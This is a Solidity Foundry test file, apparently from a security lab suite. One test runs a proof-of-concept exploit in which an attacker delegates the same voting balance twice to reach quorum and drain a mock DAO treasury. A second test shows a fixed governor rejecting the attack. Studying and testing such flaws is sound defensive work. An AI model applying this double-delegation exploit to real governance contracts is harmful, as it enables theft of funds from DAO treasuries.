// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {Treasury} from "../../src/governance-economics/target/Treasury.sol";
import {GovernorWithDelegation} from "../../src/governance-economics/target/GovernorWithDelegation.sol";
import {GovernorWithDelegationFixed} from "../../src/governance-economics/mitigations/GovernorWithDelegationFixed.sol";

contract GovernanceEconomics01Test is Test {
    MockERC20 govToken;

    GovernorWithDelegation governor;
    Treasury treasury;

    GovernorWithDelegationFixed governorFixed;
    Treasury treasuryFixed;

    address attacker = makeAddr("attacker");
    address voterB = makeAddr("voterB");
    address voterC = makeAddr("voterC");

    function setUp() public {
        govToken = new MockERC20("GOV", "GOV");
        govToken.mint(attacker, 100_000e18);

        address predictedTreasury = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 1);
        governor = new GovernorWithDelegation(address(govToken));
        treasury = new Treasury(address(governor));
        assertEq(address(treasury), predictedTreasury);
        vm.deal(address(treasury), 30 ether);

        address predictedTreasuryFixed = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 1);
        governorFixed = new GovernorWithDelegationFixed(address(govToken));
        treasuryFixed = new Treasury(address(governorFixed));
        assertEq(address(treasuryFixed), predictedTreasuryFixed);
        vm.deal(address(treasuryFixed), 30 ether);
    }

    /// @dev Traza exacta: attacker (100.000e18 GOV, un tercio del quorum de
    ///      300.000e18) delega a voterB (delegatedPower[voterB]=100k), luego
    ///      delega a voterC SIN que se reste lo de voterB (delegatedPower[voterC]
    ///      tambien =100k -- el mismo balance, contado dos veces). attacker,
    ///      voterB y voterC votan: 100k (balance propio de attacker) + 100k
    ///      (delegatedPower[voterB]) + 100k (delegatedPower[voterC]) = 300k
    ///      exactos == QUORUM, con solo 100.000e18 de poder real.
    function test_exploit_delegationDoubleCounting() public {
        assertEq(govToken.balanceOf(attacker), 100_000e18);

        vm.startPrank(attacker);
        governor.delegate(voterB);
        governor.delegate(voterC);

        bytes memory data = abi.encodeWithSignature("drain(address)", attacker);
        uint256 id = governor.propose(address(treasury), data);

        governor.vote(id);
        vm.stopPrank();

        vm.prank(voterB);
        governor.vote(id);
        vm.prank(voterC);
        governor.vote(id);

        (, , uint256 votesFor, ) = governor.proposals(id);
        assertEq(votesFor, 300_000e18, "quorum alcanzado con un tercio del poder real");

        governor.execute(id);
        assertEq(attacker.balance, 30 ether, "la tesoreria completa transferida al atacante");
    }

    /// @dev Mismo intento contra GovernorWithDelegationFixed: al delegar a
    ///      voterC, se resta primero lo que tenia voterB (queda en 0). Al
    ///      votar, ni attacker ni voterB aportan nada (delegaron o su
    ///      delegatedPower quedo en 0) -- solo voterC aporta 100k. votesFor
    ///      se queda en 100.000e18, muy por debajo del quorum.
    function test_mitigation_blocksDelegationDoubleCounting() public {
        vm.startPrank(attacker);
        governorFixed.delegate(voterB);
        governorFixed.delegate(voterC);

        bytes memory data = abi.encodeWithSignature("drain(address)", attacker);
        uint256 id = governorFixed.propose(address(treasuryFixed), data);

        governorFixed.vote(id);
        vm.stopPrank();

        vm.prank(voterB);
        governorFixed.vote(id);
        vm.prank(voterC);
        governorFixed.vote(id);

        (, , uint256 votesFor, ) = governorFixed.proposals(id);
        assertEq(votesFor, 100_000e18, "solo voterC aporta poder real, sin doble conteo");

        vm.expectRevert(bytes("Quorum not reached"));
        governorFixed.execute(id);
    }
}
